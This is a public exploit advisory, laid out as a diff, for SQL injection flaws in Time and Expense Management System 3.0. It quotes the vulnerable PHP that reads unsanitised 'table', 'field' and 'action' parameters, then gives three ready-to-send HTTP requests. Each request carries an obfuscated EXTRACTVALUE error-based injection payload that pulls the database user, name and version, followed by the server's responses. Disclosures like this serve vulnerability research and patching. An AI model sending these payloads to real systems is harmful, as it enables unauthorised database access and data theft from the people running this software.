@@ -1,0 +1,105 @@
+# Exploit Title: Time and Expense Management System 3.0 - 'table' SQL Injection
+# Dork: N/A
+# Date: 2018-10-17
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.initechs.com/
+# Software Link: http://sourceforge.net/projects/tems/files/latest
+# Version: 3.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/core/model/GetTips.php?table=[SQL]
+
+# /[PATH]/core/model/GetTips.class.php
+# ........
+# $hints_per_page = $_SESSION['ini']['display']['number_of_hints'];
+# $userEntry=ltrim($_GET["userentry"]);
+# $table = $_GET["table"];
+# $key = $_GET["field"];
+# $addlCond = $_GET["addl_cond"];
+# ........
+
+GET /[PATH]/core/model/GetTips.php?table=112112+anD++EXtrACTvaLUE(112,ConcAT(0x5c,conCAT_WS(0x203a20,useR(),DAtabaSE(),VersiON()),(SeleCT+(ELT(112=112,112))),0x49687361126e2053656e6361126e))--+Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 17 Oct 2018 01:02:25 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=0kunt4k4d2piurnrcle7nftln5; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1612
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/core/model/GetTips.php?field=[SQL]
+
+# /[PATH]/core/model/GetTips.class.php
+# ........
+# $hints_per_page = $_SESSION['ini']['display']['number_of_hints'];
+# $userEntry=ltrim($_GET["userentry"]);
+# $table = $_GET["table"];
+# $key = $_GET["field"];
+# $addlCond = $_GET["addl_cond"];
+# ........
+
+GET /[PATH]/core/model/GetTips.php?field=112112+anD++EXtrACTvaLUE(112,ConcAT(0x5c,conCAT_WS(0x203a20,useR(),DAtabaSE(),VersiON()),(SeleCT+(ELT(112=112,112))),0x49687361126e2053656e6361126e))--+Efe HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=0kunt4k4d2piurnrcle7nftln5
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 17 Oct 2018 01:09:41 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1811
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/core/controller/UpdateBORequest.php[SQL]
+# POST /action=[SQL]
+# 
+
+POST /[PATH]/core/controller/UpdateBORequest.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=3i34gub8ub4dk3jhjthinlv922
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 161
+action=EditUser' anD EXtrACTvaLUE(112,ConcAT(0x5c,conCAT(0x203a20,useR(),DAtabaSE(),VersiON()),(SeleCT (ELT(112=112,112))),0x49687361126e2053656e6361126e))-- Efe
+HTTP/1.1 200 OK
+Date: Wed, 17 Oct 2018 01:12:24 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1778
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
